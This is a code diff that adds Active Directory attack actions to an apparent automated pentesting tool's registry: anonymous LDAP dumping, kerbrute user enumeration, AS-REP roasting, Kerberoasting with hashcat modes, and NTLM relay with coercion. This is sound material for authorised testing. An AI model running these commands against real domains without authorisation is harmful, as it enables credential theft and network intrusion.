@@ -226,6 +226,27 @@ ACTION_REGISTRY: dict[str, Action] = {
     "ldapsearch_anon": _a("ldapsearch_anon",
         ["ldapsearch -x -H ldap://$IP -s base namingcontexts"], outputs="raw"),
 
+    # --- AD attack (chained off enumeration findings; see playbooks/ad.yaml) ---
+    "ldap_anon_dump": _a("ldap_anon_dump",
+        ["nxc ldap $IP -u '' -p '' --users --groups"], outputs="raw",
+        note="Anonymous LDAP dump — users/groups feed AS-REP roast + spraying."),
+    "kerbrute_userenum": _a("kerbrute_userenum",
+        ["kerbrute userenum -d <DOMAIN> --dc $IP <userlist>"],
+        runnable=False, outputs="raw",
+        note="Validate a username list against the DC (no creds). Needs a wordlist."),
+    "asreproast_users": _a("asreproast_users",
+        ["impacket-GetNPUsers <DOMAIN>/ -dc-ip $IP -usersfile <userlist> -no-pass -format hashcat"],
+        risk="propose", runnable=False, outputs="raw",
+        note="AS-REP roast — no creds needed; crack $krb5asrep$ (hashcat -m 18200)."),
+    "kerberoast_getuserspns": _a("kerberoast_getuserspns",
+        ["impacket-GetUserSPNs -request -dc-ip $IP <DOMAIN>/<USER>:<PASS>"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Kerberoast — needs valid domain creds; crack $krb5tgs$ (hashcat -m 13100)."),
+    "ntlmrelay_setup": _a("ntlmrelay_setup",
+        ["impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Relay to SMB-signing-off hosts; pair with a coercion (PetitPotam/printerbug)."),
+
     # --- Traditional: MSSQL / WinRM / SSH / RDP / FTP ---
     "netexec_mssql": _a("netexec_mssql", ["nxc mssql $IP -u '' -p ''"], outputs="raw"),
     "mssql_xp_cmdshell_check": _a("mssql_xp_cmdshell_check",
